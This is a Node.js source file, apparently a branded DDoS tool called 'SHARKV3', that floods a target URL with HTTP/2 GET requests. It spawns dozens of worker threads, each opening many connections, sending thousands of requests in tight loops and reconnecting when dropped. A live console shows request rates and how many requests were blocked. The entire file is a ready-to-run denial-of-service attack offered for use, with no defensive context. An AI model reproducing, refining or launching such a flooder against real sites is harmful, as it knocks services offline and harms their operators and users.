const http2 = require('http2');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { cpus } = require('os');
const readline = require('readline');

const THREADS = 16;
const INITIAL_CONNECTIONS = 20;
const POWER_MULTIPLIER = 2;
const WARMUP_TIME = 5000;

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let maxRps = 0;
let rpsLastSecond = 0;

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    console.clear();
    console.log(`Warming up... Starting attack in 5s`);
    setTimeout(() => {
        console.clear();
        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
        console.log(`===========================`);
        for (let i = 0; i < THREADS; i++) {
            new Worker(__filename, { workerData: { target, duration, initial: true } });
        }

        setTimeout(() => {
            for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
                new Worker(__filename, { workerData: { target, duration, initial: false } });
            }
        }, WARMUP_TIME);

        // Update live stats every second
        setInterval(() => {
            maxRps = Math.max(maxRps, rpsLastSecond);
            renderStats();
            rpsLastSecond = 0;
        }, 1000);

    }, WARMUP_TIME);

    function renderStats() {
        readline.cursorTo(process.stdout, 0, 0);
        readline.clearScreenDown(process.stdout);
        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
        console.log(`===========================`);
        console.log(`total: ${totalRequests}`);
        console.log(`max-r: ${maxRps}`);
        console.log(`===========================`);
        console.log(`succes: ${successCount}`);
        console.log(`Blocked: ${errorCount}`);
    }

    // Listen to stats from workers
    const { createServer } = require('net');
    const IPC_PORT = 9999;
    const server = createServer(socket => {
        socket.on('data', data => {
            const msg = data.toString();
            if (msg === 'req') {
                totalRequests++;
                rpsLastSecond++;
            } else if (msg === 'ok') {
                successCount++;
            } else if (msg === 'err') {
                errorCount++;
            }
        });
    });
    server.listen(IPC_PORT);
} else {
    const net = require('net');
    const { target, duration, initial } = workerData;
    const end = Date.now() + duration * 1000;
    const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;

    const socket = net.connect(9999, '127.0.0.1');

    function sendStat(msg) {
        socket.write(msg);
    }

    function startFlood(client) {
        const flood = setInterval(() => {
            if (Date.now() > end) {
                clearInterval(flood);
                return;
            }

            for (let i = 0; i < 1000; i++) {
                try {
                    const req = client.request({ ':path': '/', ':method': 'GET' });
                    req.on('response', () => sendStat('ok'));
                    req.on('error', () => sendStat('err'));
                    req.end();
                    sendStat('req');
                } catch {
                    sendStat('err');
                }
            }
        }, 0);
    }

    function createConnection() {
        let client;
        try {
            client = http2.connect(target);
        } catch {
            return setTimeout(createConnection, 250);
        }

        client.on('error', () => {});
        client.on('close', () => setTimeout(createConnection, 100));
        client.on('connect', () => startFlood(client));
    }

    for (let i = 0; i < connections; i++) {
        createConnection();
    }
}
